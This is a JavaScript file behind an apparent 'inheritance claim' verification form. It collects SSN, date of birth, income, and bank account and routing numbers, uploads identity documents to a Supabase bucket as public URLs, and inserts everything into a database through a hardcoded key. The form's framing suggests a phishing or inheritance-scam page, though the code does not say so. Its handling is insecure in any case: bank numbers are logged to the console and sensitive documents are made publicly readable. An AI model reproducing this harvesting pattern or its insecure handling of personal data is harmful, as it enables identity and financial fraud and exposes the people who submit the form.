document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector('form[role="form"]');
  const sendBtn = document.getElementById("sendBtn");
  const messageBox = document.getElementById("form-message");

  const superbase_url = "https://tgtrupaasbopvnpjdppt.supabase.co";
  const superbase_key =
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRndHJ1cGFhc2JvcHZucGpkcHB0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk2MDI4MjAsImV4cCI6MjA2NTE3ODgyMH0.L4DCD6xLvMEkCjn17l5anNXUY5USUhKQjIFi3Efpg3k";

  const bucket_name = "submission";
  const supabaseClient = supabase.createClient(superbase_url, superbase_key);

  if (!form) return;

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    // UI Feedback
    sendBtn.disabled = true;
    sendBtn.textContent = "Submitting...";
    sendBtn.classList.add("text-yellow-400");

    const formData = new FormData(form);
    const fileInput = form.querySelector('input[name="supporting_documents"]');
    const fileList = fileInput?.files;

    try {
      let fileUrls = [];

      if (fileList && fileList.length > 0) {
        for (const file of fileList) {
          const uniqueFileName = `uploads/${Date.now()}_${file.name}`;

          const { data, error } = await supabaseClient.storage
            .from(bucket_name)
            .upload(uniqueFileName, file);

          if (error)
            throw new Error("Supabase upload failed: " + error.message);

          const { data: publicUrlData } = supabaseClient.storage
            .from(bucket_name)
            .getPublicUrl(uniqueFileName);

          fileUrls.push(publicUrlData.publicUrl);
        }
      }

      console.log("Uploaded file URLs:", fileUrls);

      const receivingDividends = formData.get("receiving_dividends") === "true";

      console.log(
        "receiving_dividends value from form:",
        formData.get("receiving_dividends")
      );
      console.log("receivingDividends parsed boolean:", receivingDividends);
      console.log("Bank account number:", formData.get("bank_account_number"));
      console.log("Bank routing number:", formData.get("bank_routing_number"));

      const { error: insertError } = await supabaseClient
        .from("inheritance_claims")
        .insert([
          {
            name: formData.get("name"),
            email: formData.get("email"),
            phone: formData.get("phone"),
            dob: formData.get("dob"),
            ssn: formData.get("ssn"),
            address: formData.get("address"),
            city: formData.get("city"),
            state: formData.get("state"),
            zip: formData.get("zip"),

            employment_status: formData.get("employment_status"),
            employer_name: formData.get("employer_name") || null,
            job_title: formData.get("job_title") || null,

            rent_status: formData.get("rent_status"),
            rent_amount: parseFloat(formData.get("rent_amount")) || null,
            gross_income: parseFloat(formData.get("gross_income")) || null,
            receiving_dividends: receivingDividends,
            bank_account_number: receivingDividends
              ? formData.get("bank_account_number")
              : null,
            bank_routing_number: receivingDividends
              ? formData.get("bank_routing_number")
              : null,

            legally_married: formData.get("legally_married") || null,
            lived_together: formData.get("lived_together") || null,

            supporting_documents: fileUrls,
          },
        ]);

      if (insertError)
        throw new Error("DB insert failed: " + insertError.message);

      form.reset();
      document.getElementById("uploadedFiles").innerHTML = "";
      showMessage("✅ Form submitted successfully!", "text-green-600");
    } catch (err) {
      showMessage(`❌ Error: ${err.message}`, "text-red-600");
    } finally {
      sendBtn.disabled = false;
      sendBtn.textContent = "Submit Verification";
      sendBtn.classList.remove("opacity-60", "cursor-not-allowed");
    }
  });

  function showMessage(text, colorClass) {
    messageBox.textContent = text;
    messageBox.className = `transition-opacity duration-500 text-center text-base mb-4 ${colorClass}`;
    messageBox.classList.remove("hidden", "opacity-0");
    messageBox.classList.add("opacity-100");

    setTimeout(() => {
      messageBox.classList.add("opacity-0");
      setTimeout(() => {
        messageBox.classList.add("hidden");
        messageBox.textContent = "";
      }, 500);
    }, 6000);
  }
});
